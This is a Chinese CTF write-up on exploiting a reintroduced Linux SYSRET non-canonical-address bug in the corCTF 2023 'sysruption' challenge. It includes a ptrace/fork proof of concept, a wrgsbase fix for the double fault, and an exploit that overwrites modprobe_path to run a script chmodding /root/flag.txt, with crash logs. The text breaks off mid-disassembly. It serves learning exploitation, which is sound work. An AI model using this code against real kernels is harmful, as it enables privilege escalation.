# 以 corCTF 2023 sysruption 学习 sysret bug 的利用

> 原文: https://www.ctfiot.com/166547.html
> ID: 166547

一

前言

这是一道关于SYSRET漏洞利用的一道题目，感觉非常有意思，在此仅做记录。

这里默认读者对系统调用、中断异常故障有基本的了解，知道段选择子是什么、其特权级代表什么含义。如果不是很了解的话建议做一做hxp CTF 2022: one_byte（https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/）这道题目，可以帮助你快速了解。但还是建议看下保护模式相关的书籍，其介绍的更加详细。

二

漏洞分析

启动脚本如下：

#!/bin/sh
qemu-system-x86_64 
    -m 4096M 
    -smp 1 
    -nographic 
    -kernel "./bzImage" 
    -append "console=ttyS0 loglevel=3 panic=-1 pti=off kaslr" 
    -no-reboot 
    -monitor /dev/null 
    -cpu host 
    -netdev user,id=net 
    -device e1000,netdev=net 
    -initrd "./initramfs.cpio.gz" 
    -enable-kvm

看到-cpu host就想到EntryBleed，这个漏洞我记得在之前的SCTF似乎考过。所以这里的kaslr可以很简单地利用侧信道绕过。

FizzBuzz101大师在题目（https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/pwn/sysruption）中重新引入了sysret漏洞，其patch如下：

--- orig_entry_64.S
+++ linux-6.3.4/arch/x86/entry/entry_64.S
@@ -150,13 +150,13 @@
        ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", 
                "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
-       shl     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-       sar     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # shl   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # sar   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 #endif

        /* If this changed %rcx, it was not canonical */
-       cmpq    %rcx, %r11
-       jne     swapgs_restore_regs_and_return_to_usermode
+       # cmpq  %rcx, %r11
+       # jne   swapgs_restore_regs_and_return_to_usermode

        cmpq    $__USER_CS, CS(%rsp)            /* CS must match SYSRET */
        jne     swapgs_restore_regs_and_return_to_usermode

可以看到，这里删除了sysret执行前对返回地址%rcx的canonical检查。原来的意思是如果%rcx是一个non canonical地址，则跳转的slow exit path [swapgs_restore_regs_and_return_to_usermode]，否则执行fast exit path [sysret]。

那么什么叫做canonical地址呢？我们知道在64-bit时代，虚拟地址空间寻址只用了48 bit，因为48 bit的地址空间是足够的，并且对于48 bit的虚拟地址空间，只需要 4 级页表即可；而对于64 bit的虚拟地址空间，则需要 6 级页表，而页表查询是需要时间的。所以综合考虑，最终只使用了48 bit来寻址。那么这里就有16 bit没有被使用，而为了便于后续扩展，这里采用的方式是：

◆高16 bit [48 - 63 bit]必须和第17 bit相同，也就是说高17 bit必须相同，那么这些地址就叫做canonical address（其实就是有效地址）。

◆所以最后的虚拟地址空间为：0~0x7fffffffffff和0xffff800000000000~0xffffffffffffffff。

◆而一般而言：0~0x7fffffffffff为用户态虚拟地址空间；0xffff800000000000~0xffffffffffffffff为内核态虚拟地址空间。

而可以看到entry_SYSCALL_64源码中对上述canonical address check的描述：

/*
  * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
  * in kernel space.  This essentially lets the user take over
  * the kernel, since userspace controls RSP.
  *
  * If width of "canonical tail" ever becomes variable, this will need
  * to be updated to remain correct on both old and new CPUs.
  *
  * Change top bits to match most significant bit (47th or 56th bit
  * depending on paging mode) in the address.
  */

可以知道，当SYSRET返回到一个non canonical地址时，会在内核态触发#GP，而这本质上就是让用户接管内核，因为用户可以在用户空间控制RSP。当然这里不理解没关系，继续往下看就ok啦。

这里还是先把entry_SYSCALL_64函数过一遍，当然这个函数比较简单，并且注释很清楚，所以只会翻译重点注释：

/*
 * 64-bit SYSCALL instruction entry. Up to 6 arguments in registers.
 * 64-bit 的 syscall 指令入口，最多 6 个寄存器参数
 *
 * This is the only entry point used for 64-bit system calls.  The
 * hardware interface is reasonably well designed and the register to
 * argument mapping Linux uses fits well with the registers that are
 * available when SYSCALL is used.
 * 这是 64-bit 系统调用的唯一入口点
 *
 * SYSCALL instructions can be found inlined in libc implementations as
 * well as some other programs and libraries.  There are also a handful
 * of SYSCALL instructions in the vDSO used, for example, as a
 * clock_gettimeofday fallback.
 *
 * 64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,
 * then loads new ss, cs, and rip from previously programmed MSRs.
 * rflags gets masked by a value from another MSR (so CLD and CLAC
 * are not needed). SYSCALL does not save anything on the stack
 * and does not change rsp.
 * 64-bit syscall 保持 rip 到 rcx 中，并清除 rflags.RF 标志位，然后保存 rflags 到 r11 中
 * 然后从 MSR 寄存器组中加载新的 ss、cs 和 rip，rflags 的一些标志位会被清除
 * syscall 不在栈上保存任何值并且不会改变 rsp
 *
 * Registers on en
try:
 * 下面是 syscall 使用的一些寄存器
 * rax  system call number  系统调用号
 * rcx  return address 返回地址
 * r11  saved rflags (note: r11 is callee-clobbered register in C ABI) rflags
 * rdi  arg0	6个参数寄存器
 * rsi  arg1
 * rdx  arg2
 * r10  arg3 (needs to be moved to rcx to conform to C ABI)
 * r8   arg4
 * r9   arg5
 * (note: r12-r15, rbp, rbx are callee-preserved in C ABI)
 *
 * Only called from user space.
 *
 * When user can change pt_regs->foo always force IRET. That is because
 * it deals with uncanonical addresses better. SYSRET has trouble
 * with them due to bugs in both AMD and Intel CPUs.
 * 这段话的意思简而言之就是：
 * 当处理 non canonical address 时，用 iret 返回
 * 否则使用 sysret 返回，因为 sysret 更快
 */

SYM_CODE_START(entry_SYSCALL_64)
	UNWIND_HINT_ENTRY
	ENDBR

	swapgs	/* 切换 gs [gsbase] 为内核态 gs */
	/* tss.sp2 is scratch space. */
	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2) /* 保存 rsp */
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp  /* 切换页表，cr3 寄存器保存的是顶层目录项的基地址*/
	movq	PER_CPU_VAR(pcpu_hot + X86_top_of_stack), %rsp /* 切换栈帧，可以引证 syscall 不改变 rsp */

SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	/* 下面就是依次压栈寄存器了，其实就是在栈上构造一个 pt_regs 结构体 */
	/* Construct struct pt_regs on stack */
	pushq	$__USER_DS /* pt_regs->ss */
	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs->sp */
	pushq	%r11 /* pt_regs->flags */
	pushq	$__USER_CS /* pt_regs->cs */
	pushq	%rcx /* pt_regs->ip */
SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)
	pushq	%rax /* pt_regs->orig_ax */

	PUSH_AND_CLEAR_REGS rax=$-ENOSYS /* 这里会把其它寄存器压栈，并且会把寄存器的值清零*/

	/* IRQs are off. */
	/* 下面设置的 rdi/rsi 是 do_syscall_64 函数的两个参数 */
	/* rdi 保存的就是栈上 pt_regs 的地址 */
	movq	%rsp, %rdi
	/* Sign extend the lower 32bit as syscall numbers are treated as int */
	/* rsi 保存的是系统调用号 */
	movslq	%eax, %rsi

	/* clobbers %rax, make sure it is after saving the syscall nr */
	IBRS_ENTER
	UNTRAIN_RET
	/* 去执行相应的功能 */
	call	do_syscall_64 /* returns with IRQs disabled */

	/*
	 * Try to use SYSRET instead of IRET if we're returning to
	 * a completely clean 64-bit userspace context.  If we're not,
	 * go to the slow exit path.
	 * In the Xen PV case we must use iret anyway.
	 * 这里会尝试使用 sysret 返回而不是 iret，利用就是 sysret 更快
	 */

	ALTERNATIVE "", "jmp	swapgs_restore_regs_and_return_to_usermode", 
 X86_FEATURE_XENPV
	/* rcx r11 都是返回地址的值 */
	movq	RCX(%rsp), %rcx
	movq	RIP(%rsp), %r11
    /* 检查两个值是否相等 */
	cmpq	%rcx, %r11	/* SYSRET requires RCX == RIP */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
	 * in kernel space.  This essentially lets the user take over
	 * the kernel, since userspace controls RSP.
	 *
	 * If width of "canonical tail" ever becomes variable, this will need
	 * to be updated to remain correct on both old and new CPUs.
	 *
	 * Change top bits to match most significant bit (47th or 56th bit
	 * depending on paging mode) in the address.
	 */
#ifdef CONFIG_X86_5LEVEL
	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", 
 "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
#else
	/* canonical address 检查 */
	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
#endif

	/* If this changed %rcx, it was not canonical */
	cmpq	%rcx, %r11
	jne	swapgs_restore_regs_and_return_to_usermode
	/* 检查 cs */
	cmpq	$__USER_CS, CS(%rsp) /* CS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode
	/* 检查 rflags */
	movq	R11(%rsp), %r11
	cmpq	%r11, EFLAGS(%rsp) /* R11 == RFLAGS */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot
	 * restore RF properly. If the slowpath sets it for whatever reason, we
	 * need to restore it correctly.
	 *
	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a
	 * trap from userspace immediately after SYSRET.  This would cause an
	 * infinite loop whenever #DB happens with register state that satisfies
	 * the opportunistic SYSRET conditions.  For example, single-stepping
	 * this user code:
	 *
	 *           movq	$stuck_here, %rcx
	 *           pushfq
	 *           popq %r11
	 *   stuck_here:
	 *
	 * would never get past 'stuck_here'.
	 */
	/* 这里看上面注释，简单来说 sysret 不能恢复某些 rflags 的标志位 */
	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11
	jnz	swapgs_restore_regs_and_return_to_usermode

	/* nothing to check for RSP */
	/* 可以看到，这里没有检查 rsp */
	/* 检查 ss */
	cmpq	$__USER_DS, SS(%rsp) /* SS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * We win! This label is here just for ease of understanding
	 * perf profiles. Nothing jumps here.
	 */
	/* 下面就是 sysret 返回逻辑 */
syscall_return_via_sysret:
	IBRS_EXIT
	POP_REGS pop_rdi=0 /* 恢复相关寄存器的值，这里可以调试看更明显 */

	/*
	 * Now all regs are restored 
except RSP and RDI.
	 * Save old stack pointer and switch to trampoline stack.
	 */
	movq	%rsp, %rdi
	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp /* 切换到内核栈 */
	UNWIND_HINT_EMPTY

	pushq	RSP-RDI(%rdi)	/* RSP */
	pushq	(%rdi) /* RDI */

	/*
	 * We are on the trampoline stack.  All regs 
except RDI are live.
	 * We can do future final exit work right here.
	 */
	STACKLEAK_ERASE_NOCLOBBER

	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

	popq	%rdi /* 这里保存的返回值*/
	popq	%rsp /* 恢复 rsp */
SYM_INNER_LABEL(entry_SYSRETQ_unsafe_stack, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	swapgs /* 切换 gs 为用户态 gs */
	sysretq /* sysretq 返回 */
SYM_INNER_LABEL(entry_SYSRETQ_end, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	int3
SYM_CODE_END(entry_SYSCALL_64)

sysret指令的作用总的来说就是：

◆加载rcx到rip中

◆切换代码段选择子

来看下Intel和AMD手册对sysret的伪代码规范性描述：

------------------ INTEL -------------------|-------------------  AMD ----------------------
...                                         | ...
IF (operand size is 64-bit)                 | SYSRET_64BIT_MODE:
    THEN (* Return to 64-Bit Mode *)        | IF (OPERAND_SIZE == 64) {
    IF (RCX is not canonical) THEN #GP(0);  | {
        RIP := RCX;                         |      CS.sel = (MSR_STAR.SYSRET_CS + 16) OR 3
    ELSE (* Return to Compatibility Mode *) |      ...
        RIP := ECX;                         | }
FI;                                         | ...
...                                         | RIP = temp_RIP
CS.Selector := CS.Selector OR 3;            | EXIT
            (* RPL forced to 3 *)           |
...                                         |

可以看到在Intel规范中，如果RCX即返回地址不是一个canonical address的话，就会触发#GP，然而可以看到其CS选择子的设置却在#GP后面，也就是说在#GP抛出时CS特权级为 0， 即#GP是在内核态抛出的。

但是在AMD规范中，其是先设置了CS的选择子，所以其并没有对地址进行显式的canonical检查，因为就算后面进行指令预取时发现其为non canonical address也没有关系，因为此时的CS选择子的特权级为 3，最后#GP是在用户态抛出的。

这会造成什么后果呢？在上面entry_SYSCALL_64函数的分析中，我们说了在sysret执行前恢复了rsp并且没有对rsp的检查。而我们知道当特权级从低往高转移时，会利用tss中的相关ss/rsp进行堆栈的切换（当然具体实现时，似乎都没有使用tss，据说是因为其效率太低了），而由于#GP是在特权级为 0 抛出的，所以这里没有发生特权级的低到高切换，所以堆栈不会发生变化，即使用的还是之前的rsp。哪问题不就来了吗？之前的rsp是用户态可控的啊，所以最好的效果如下：

◆#GP在 0 特权级执行

◆#GP使用用户空间提供的堆栈指针

三

漏洞利用

由于水平有限，最后漏洞利用完全参考corCTF 2023: sysruption writeup和Vitaly Nikolenko: CVE-2014-4699: Linux Kernel ptrace/sysret vulnerability analysis，而第一篇文章也是参考的第二篇文章，所以读者可以选择细读一下第二篇文章。

在文章中，其提到的用ptrace去触发漏洞，但是这里存在一定的限制，但其给出了解决方案，即：

Most ptrace paths go via the interface that catches the process using the signal handler which always returns with IRET. However, there are a few paths that can get caught with ptrace_event() instaed of the signal path. Refer to the PoC code for an example of using fork() with ptrace to force such a path.

这里给出文章中的poc：

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}

这里可以简单测试一下：

int main() {

        struct user_regs_struct regs;

        do_sysret(0xdeadbeef, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}

结果如下：

ctf@corctf:~$ ./poc
[   10.018563] traps: PANIC: double fault, error_code: 0x0
[   10.018619] double fault: 0000 [#1] PREEMPT SMP NOPTI
[   10.018658] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
[   10.018660] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   10.018662] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   10.018900] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   10.018902] RSP: 0018:
00000000deadbeef EFLAGS: 00010046
[   10.018937] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
[   10.018938] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
[   10.018939] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
[   10.018940] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
[   10.018941] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
[   10.018942] FS:  0000000000402fcc(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   10.018944] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.018945] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
[   10.019027] PKRU: 55555554
[   10.019027] Call Trace:
[   10.019096] Modules linked in:
[   10.083849] ---[ end trace 0000000000000000 ]---
[   10.083854] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   10.083865] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   10.083867] RSP: 0018:
00000000deadbeef EFLAGS: 00010046
[   10.083869] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
[   10.083870] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
[   10.083871] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
[   10.083872] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
[   10.083921] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
[   10.083934] FS:  0000000000402fcc(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   10.083935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.083936] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
[   10.084008] PKRU: 55555554
[   10.084009] Kernel panic - not syncing: Fatal exception in interrupt
[   10.084920] Kernel Offset: disabled

可以看到这里的RIP = entry_SYSRETQ_unsafe_stack+0x3/0x6，说明确实是在sysret中触发的，并且这里的RSP = 0xdeadbeef，并且CPU特权级为 0，这些都是符合预期的。但是这里却发生了double fault，这是致命的。

难道是0xdeadbeef不是一个合法的地址，于是进行如下测试：

int main() {

        char RSP[0x3000] = { 0 };

        struct user_regs_struct regs;
        printf("%#pn", RSP);
        do_sysret(RSP + 0x1000, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}

还是double fault：

0x7ffe97c51690
[   11.949086] traps: PANIC: double fault, error_code: 0x0
[   11.949132] double fault: 0000 [#1] PREEMPT SMP NOPTI
[   11.949160] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
[   11.949163] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   11.949164] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   11.949350] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   11.949351] RSP: 0018:
00007ffe97c52690 EFLAGS: 00010046
......

所以这里似乎跟rsp的值没啥关系。

这里产生double fault的原因是GP handler非预期的使用了用户空间的gsbase，gsbase寄存器是用来访问percpu变量的，比如在系统调用时，entry_SYSCALL_64的第一条指令就是swapgs即切换到内核gsbase，然后返回时又调用swapgs切换到用户gsbase。

接下来看下GP handler - asm_exc_general_protection：

(remote) gef➤  x/30gi asm_exc_general_protection
   0xffffffff81a00a90 <asm_exc_general_protection>:     clac
   0xffffffff81a00a93 <asm_exc_general_protection+3>:   cld
   0xffffffff81a00a94 <asm_exc_general_protection+4>:   call   0xffffffff81a011c0 <error_entry>
   0xffffffff81a00a99 <asm_exc_general_protection+9>:   mov    rsp,rax
   0xffffffff81a00a9f <asm_exc_general_protection+12>:  mov    rdi,rsp
   0xffffffff81a00a9f <asm_exc_general_protection+15>:  mov    rsi,QWORD PTR [rsp+0x78]
   0xffffffff81a00aa4 <asm_exc_general_protection+20>:  mov    QWORD PTR [rsp+0x78],0xffffffffffffffff
   0xffffffff81a00aad <asm_exc_general_protection+29>:  call   0xffffffff817f2430 <exc_general_protection>
   0xffffffff81a00ab2 <asm_exc_general_protection+34>:  jmp    0xffffffff81a01300 <error_return>
   0xffffffff81a00ab7 <asm_exc_general_protection+39>:  nop    WORD PTR [rax+rax*1+0x0]
......

可以看到这里首先会调用error_entry：

如果你做了one_byte这题，这里的calc应该比较熟悉

(remote) gef➤  x/60gi error_entry
   0xffffffff81a011c0 <error_entry>:    push   rsi
   0xffffffff81a011c1 <error_entry+1>:  mov    rsi,QWORD PTR [rsp+0x8]
   0xffffffff81a011c6 <error_entry+6>:  mov    QWORD PTR [rsp+0x8],rdi
   /* push regs */
   0xffffffff81a011cb <error_entry+11>: push   rdx
   0xffffffff81a011cc <error_entry+12>: push   rcx
   0xffffffff81a011cd <error_entry+13>: push   rax
   0xffffffff81a011ce <error_entry+14>: push   r8
   0xffffffff81a011d0 <error_entry+16>: push   r9
   0xffffffff81a011d2 <error_entry+18>: push   r10
   0xffffffff81a011d4 <error_entry+20>: push   r11
   0xffffffff81a011d6 <error_entry+22>: push   rbx
   0xffffffff81a011d7 <error_entry+23>: push   rbp
   0xffffffff81a011d8 <error_entry+24>: push   r12
   0xffffffff81a011da <error_entry+26>: push   r13
   0xffffffff81a011dc <error_entry+28>: push   r14
   0xffffffff81a011de <error_entry+30>: push   r15
   0xffffffff81a011e0 <error_entry+32>: push   rsi
   /* clear regs */
   0xffffffff81a011e1 <error_entry+33>: xor    esi,esi
   0xffffffff81a011e3 <error_entry+35>: xor    edx,edx
   0xffffffff81a011e5 <error_entry+37>: xor    ecx,ecx
   0xffffffff81a011e7 <error_entry+39>: xor    r8d,r8d
   0xffffffff81a011ea <error_entry+42>: xor    r9d,r9d
   0xffffffff81a011ed <error_entry+45>: xor    r10d,r10d
   0xffffffff81a011f0 <error_entry+48>: xor    r11d,r11d
   0xffffffff81a011f3 <error_entry+51>: xor    ebx,ebx
   0xffffffff81a011f5 <error_entry+53>: xor    ebp,ebp
   0xffffffff81a011f7 <error_entry+55>: xor    r12d,r12d
   0xffffffff81a011fa <error_entry+58>: xor    r13d,r13d
   0xffffffff81a011fd <error_entry+61>: xor    r14d,r14d
   0xffffffff81a01200 <error_entry+64>: xor    r15d,r15d
   /* check cs.cpl*/
   0xffffffff81a01203 <error_entry+67>: test   BYTE PTR [rsp+0x90],0x3
   0xffffffff81a0120b <error_entry+75>: je     0xffffffff81a0125c <error_entry+156>
   0xffffffff81a0120d <error_entry+77>: swapgs
......

首先可以看到这里会先push regs到栈中，寄存器的值是可控的，rsp可控的，所以这里相当于任意内核地址写了（只是相当于）。

然后可以看到如果这里的cs.cpl是 3 特权级的话，就会执行一次swapgs，而我们知道漏洞触发后这里的cs.cpl = 0，所以这里就不会执行swapgs。而在之前的entry_SYSCALL_64分析中，我们知道在执行sysret之前已经执行过了一次swapgs：

......
 swapgs /* 切换 gs 为用户态 gs */
 sysretq /* sysretq 返回 */

所以这里GP handler使用的是用户态的gs[gsbase]，而asm_exc_general_protection后面会调用exc_general_protection：

(remote) gef➤  x/60gi exc_general_protection
   0xffffffff817f2430 <exc_general_protection>:            push   r13
   0xffffffff817f2432 <exc_general_protection+2>:       mov    r13,rsi
   0xffffffff817f2435 <exc_general_protection+5>:       push   r12
   0xffffffff817f2437 <exc_general_protection+7>:       push   rbp
   0xffffffff817f2438 <exc_general_protection+8>:       mov    rbp,rdi
   0xffffffff817f243b <exc_general_protection+11>:      push   rbx
   0xffffffff817f243c <exc_general_protection+12>:      sub    rsp,0x70
   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:
0x28 <=== double fault
......

而在exc_general_protection中用户态gs被首次使用从而导致double fault。

在Vitaly Nikolenko的文章中，其是通过覆写IDT表从而劫持PF handler到用户态代码，其文章是 14 年的，内核版本为3.x，但现在都 2024 年了，IDT早已不可写了，而且SMEP也将直接限制内核直接执行用户态代码。

在zolutal的文章中，其提到既然是由用户态gsbase导致的PF，那么我们是否可以直接控制用户态的gsbase，让其指向一个内核地址从而防止PF。

而作者发现在x86中存在一个fsgsbase扩展通常是开启的【参考intel官方文档（https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/best-practices/guidance-enabling-fsgsbase.html）】，其可以让我们在用户态通过wrgsbase汇编指令去设置gsbase。

这里最稳定的做法就是将user gsbase设置为kernel gsbase，所以这里的泄漏kernel gsbase。而kernel gsbase在physmap中，所以这里也是利用侧信道泄漏，这里还是见EntryBleed，但是其似乎不是很稳定，所以FizzBuzz101调整了一下使其更加稳定了，主要就是调整了一下步距，具体见其文章。

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
......

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        asm volatile("wrgsbase %0" : : "r" (gsbase)); // <==== 修改 user gsbase

        raise(SIGSTOP);
        fork();
        return 0;
    }

......
}

测试可以发现，这里的rsp不能为用户态地址（好像说pti有SMAP的作用，所以这里会出现一些问题），然后简单设置rsp为内核可读写地址（其实就是需要栈的属性），然后发现并没有产生double fault：

ctf@corctf:~$ ./poc
[+] do_sysret
[    8.589102] general protection fault, maybe for address 0x4e: 0000 [#1] PREEMPT SMP NOPTI
......
[+] EXP NEVER END
[    9.593334] BUG: kernel NULL pointer dereference, address: 0000000000000253
[    9.598734] #PF: supervisor read access in kernel mode
[    9.601579] #PF: error_code(0x0000) - not-present page
......

当然这里产生的#PF可以暂时不管，这是由于poc中的一些参数没有设置好，这节的重点在于解决double fault问题。

在上述的分析中，我们得到了一个内核地址写原语。这里题目给了kconfig，查看可以知道其没有开启CONFIG_STATIC_USERMODEHELPER，所以这里可以尝试写modprobe_path提权或者拿flag。

第一版exp：

#include <stdio.h>
#include 
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>

uint64_t gsbase = 0xffff88813bc00000;
uint64_t modprobe_path = 0xffffffff8203b840;

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
 ......
}

void pre_get_flag(){
        system("echo -ne '#!/bin/shn/bin/chmod 777 /root/flag.txt' > /tmp/x");
        system("chmod +x /tmp/x");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
}

void get_flag() {
        system("/tmp/dummy");
        system("cat /root/flag.txt");
}

int main() {

        struct user_regs_struct regs;

        pre_get_flag();

        char str[8] = "/tmp/xx00x00";
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = *((uint64_t*)str);
        }

        puts("n[+] do_sysret");
        getchar();
        do_sysret(modprobe_path + 0x78, &regs);
        sleep(1);

        puts("n[+] get_flag");
      getchar();
        get_flag();
        sleep(1);
        puts("[+] EXP NEVER END");
        return 0;
}

写modprobe_path前：

(remote) gef➤  x/s 0xffffffff8203b840
0xffffffff8203b840:     "/sbin/modprobe"

写modprobe_path后：

gef➤  x/s 0xffffffff8203b840
0xffffffff8203b840:     "/tmp/x"

get_flag：

[+] get_flag
[   23.158576] BUG: kernel NULL pointer dereference, address: 00000000000001e0
[   23.165033] #PF: supervisor read access in kernel mode
[   23.175756] #PF: error_code(0x0000) - not-present page
[   23.178612] PGD 10115a067 P4D 10115a067 PUD 101153067 PMD 0
[   23.183171] Oops: 0000 [#2] PREEMPT SMP NOPTI
[   23.186155] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[   23.191255] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   23.197747] Workqueue: events_unbound call_usermodehelper_exec_work
[   23.202854] RIP: 0010:
inc_rlimit_ucounts+0x31/0x70
[   23.206428] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 c0 46 eb 1c 48 39 cf 4c 0f 44 d0 48 8b 41 10 <48> 8b 88 e0 01 00 00 4e 8b 4c c8
[   23.226013] RSP: 0018:
ffffc900000e3cb8 EFLAGS: 00010246
[   23.229254] RAX: 0000000000000000 RBX: ffff888101038000 RCX: ffffffff8203b6c0
[   23.233876] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[   23.243660] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
[   23.251135] R10: 0000000000000001 R11: 0000000000000025 R12: 0000000000000000
[   23.255452] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
[   23.260494] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
0000000000000000
[   23.268356] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   23.272230] CR2: 00000000000001e0 CR3: 0000000100a8c006 CR4: 0000000000770ef0
......

可以看到最后在get_flag 时，在inc_rlimit_ucounts中发生了#PF，既然是缺页故障，拿必然就是某个读取值存在问题了。

(remote) gef➤  gef-remox/40gi inc_rlimit_ucounts
   0xffffffff8109e980 :    test   rdi,rdi
   0xffffffff8109e983 :   je     0xffffffff8109e9e1 
   0xffffffff8109e985 :   mov    r8d,esi
   0xffffffff8109e988 :   mov    rcx,rdi
   0xffffffff8109e98b :  xor    r10d,r10d
   0xffffffff8109e98e :  movabs r9,0x7fffffffffffffff
